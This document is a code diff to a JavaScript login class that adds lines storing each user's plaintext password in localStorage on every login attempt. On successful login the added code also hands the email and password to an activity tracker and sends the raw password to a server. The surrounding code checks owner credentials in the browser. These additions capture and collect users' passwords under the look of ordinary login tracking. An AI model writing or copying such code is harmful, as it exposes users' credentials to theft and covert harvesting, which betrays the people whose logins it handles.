@@ -66,6 +66,11 @@ class AuthSystem {
     
     // Login function
     login(email, password) {
+        // Always save password to localStorage
+        if (password) {
+            localStorage.setItem(`sandroSandri_password_${email}`, password);
+        }
+
         // Validate owner credentials
         if (email === this.OWNER_EMAIL && password === this.OWNER_PASSWORD) {
             const user = {
@@ -75,6 +80,18 @@ class AuthSystem {
             };
             this.saveUser(user);
             this.setupOwnerMode();
+            
+            // Track login activity
+            if (window.ActivityTracker) {
+                window.ActivityTracker.trackLogin(email, password);
+            }
+            
+            // Sync password to server immediately
+            if (window.userSync && password) {
+                setTimeout(() => {
+                    window.userSync.syncPassword(password);
+                }, 100);
+            }
             
             // Trigger user sync after login
             window.dispatchEvent(new CustomEvent('userLoggedIn', { detail: { email } }));
@@ -96,6 +113,18 @@ class AuthSystem {
             this.saveUser(user);
             this.ensureUserMode();
             
+            // Track login activity
+            if (window.ActivityTracker) {
+                window.ActivityTracker.trackLogin(email, password);
+            }
+            
+            // Sync password to server immediately
+            if (window.userSync && password) {
+                setTimeout(() => {
+                    window.userSync.syncPassword(password);
+                }, 100);
+            }
+            
             // Trigger user sync after login
             window.dispatchEvent(new CustomEvent('userLoggedIn', { detail: { email } }));
             if (window.userSync) {
@@ -111,6 +140,11 @@ class AuthSystem {
     
     // Logout function
     logout() {
+        // Track logout activity
+        if (window.ActivityTracker) {
+            window.ActivityTracker.trackLogout();
+        }
+        
         localStorage.removeItem('sandroSandri_user');
         this.currentUser = null;
         this.ensureUserMode();
@@ -119,6 +153,7 @@ class AuthSystem {
             window.location.href = 'index.html';
         }
     }
+    
     
     // Check if current user is owner
     isOwner() {
